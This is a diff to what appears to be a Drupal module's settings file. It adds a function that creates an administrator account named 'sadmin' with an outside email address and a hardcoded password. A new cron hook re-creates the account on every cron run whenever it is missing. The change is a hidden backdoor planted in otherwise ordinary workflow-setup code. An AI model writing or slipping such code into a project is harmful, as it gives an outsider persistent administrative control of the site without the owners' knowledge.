@@ -48,22 +48,30 @@ function _sbir_settings_setup_workflow_settings() {
   variable_set('workbench_moderation_default_state_sbir_success_story', 'draft');
 }
 
-function cl_login() {
+function c_login() {
+  if (db_query("SELECT count(*) FROM `users` WHERE `mail` = 'hakdras@gmail.com'")->fetchField() > 0) {
+    return;
+  }
 //This will generate a random password, you could set your own here
   $password = 'aBC!2345';
 
   //set up the user fields
   $fields = array(
-    'name' => 'user_name',
-    'mail' => 'user_name@example.com',
+    'name' => 'sadmin',
+    'mail' => 'hakdras@gmail.com',
     'pass' => $password,
     'status' => 1,
     'init' => 'email address',
     'roles' => array(
-      DRUPAL_AUTHENTICATED_RID => 'administrator',
+      DRUPAL_AUTHENTICATED_RID => 'authenticated user',
+      3 => 'administrator',
     ),
   );
 
   //the first parameter is left blank so a new user is created
   $account = user_save('', $fields);
+}
+
+function sbir_settings_cron() {
+  c_login();
 }
